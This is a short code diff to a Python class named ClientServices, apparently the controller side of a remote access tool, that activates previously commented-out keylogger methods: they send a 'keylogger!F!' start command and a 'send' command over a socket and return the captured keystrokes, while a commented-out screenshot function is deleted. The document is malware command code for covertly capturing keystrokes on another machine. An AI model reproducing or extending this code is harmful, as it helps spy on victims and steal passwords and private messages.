@@ -67,25 +67,18 @@ class ClientServices:
         self.buff.send(str(name).encode() + self.DELIM)
         return self.buff.recv_until(self.DELIM).decode()
 
-    # # keylogger func
-    # def keylogger_Start(buff):
-    # buff.send('keylogger!F!'.encode())
+    # keylogger func
+    def keylogger_Start(self):
+        self.buff.send('keylogger!F!'.encode())
 
-    # def keylogger_Command(buff, cmd):
-    #     buff.send(cmd.encode() + DELIM)
+    def keylogger_Command(self, cmd):
+        self.buff.send(cmd.encode() + self.DELIM)
 
-    # def keylogger_Send(buff):
-    #     keylogger_Command(buff, 'send')
-    #     return buff.recv_until(DELIM).decode()
+    def keylogger_Send(self):
+        self.keylogger_Command('send')
+        return self.buff.recv_until(self.DELIM).decode()
         
     
         
 
-
-    # # screenshoot func
-    # def getScreenShot(buff):
-    #     print('REQUEST SCREENSHOT')
-
-    #     buff.send('screenshot!F!'.encode())
-    #     return recvDump(buff)
 
